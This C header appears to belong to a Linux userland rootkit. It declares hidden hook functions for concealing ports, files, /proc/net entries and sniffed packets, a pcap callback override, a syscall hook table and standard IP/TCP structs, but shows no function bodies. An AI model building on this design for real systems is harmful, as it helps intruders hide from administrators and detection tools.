#pragma once

#include <limits.h>
#include <pcap/pcap.h>

#include "const.h"

#define _STAT_VER 1
#define SIZE_ETHERNET 14

#define IP_HL(ip) (((ip)->ip_vhl) & 0x0f)

static int is_loaded = 0;
static int owner = 0;

static void init (void) __attribute__ ((constructor));
static void (*old_pcap_callback)(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);

int is_owner(void) __attribute__((visibility("hidden")));
int is_procnet(const char *filename) __attribute__((visibility("hidden")));
int is_invisible(const char *path) __attribute__((visibility("hidden")));
void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) __attribute__((visibility("hidden")));
FILE *hide_ports(const char *filename) __attribute__((visibility("hidden")));

typedef struct struct_syscalls {
    char syscall_name[51];    // buffer for syscall name (50 characters + 1 null terminator)
    void *(*syscall_func)();  // pointer to the original syscall function
} s_syscalls;

s_syscalls syscall_list[SYSCALL_SIZE];

// IP header
struct sniff_ip {
    u_char  ip_vhl;                     // version << 4 | header length >> 2
    u_char  ip_tos;                     // type of service
    u_short ip_len;                     // total length
    u_short ip_id;                      // identification
    u_short ip_off;                     // fragment offset field
    #define IP_RF 0x8000                // reserved fragment flag
    #define IP_DF 0x4000                // dont fragment flag
    #define IP_MF 0x2000                // more fragments flag
    #define IP_OFFMASK 0x1fff           // mask for fragmenting bits
    u_char  ip_ttl;                     // time to live
    u_char  ip_p;                       // protocol
    u_short ip_sum;                     // checksum
    struct  in_addr ip_src,ip_dst;      // source and dest address
};

// TCP header
struct sniff_tcp {
    u_short th_sport;                   // source port
    u_short th_dport;                   // destination port
    u_int th_seq;                       // sequence number
    u_int th_ack;                       // acknowledgement number
    u_char  th_offx2;                   // data offset, rsvd
    #define TH_OFF(th) (((th)->th_offx2 & 0xf0) >> 4)
    u_char  th_flags;
    #define TH_FIN  0x01
    #define TH_SYN  0x02
    #define TH_RST  0x04
    #define TH_PUSH 0x08
    #define TH_ACK  0x10
    #define TH_URG  0x20
    #define TH_ECE  0x40
    #define TH_CWR  0x80
    #define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
    u_short th_win;                     // window
    u_short th_sum;                     // checksum
    u_short th_urp;                     // urgent pointer
};

